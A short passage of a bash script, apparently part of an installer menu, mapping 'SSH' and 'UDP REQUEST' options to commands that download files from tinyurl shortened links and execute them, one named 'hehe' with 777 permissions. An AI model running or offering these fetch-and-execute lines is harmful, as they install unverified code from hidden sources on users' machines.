...
declare -A scripts
scripts["SSH"]="apt-get update -y; apt-get upgrade -y; wget https://tinyurl.com/2n8nch9w; chmod 777 hehe; ./hehe"
scripts["UDP REQUEST"]="wget https://tinyurl.com/2h9bvm5r; chmod +x UDPserver.sh; ./UDPserver.sh"
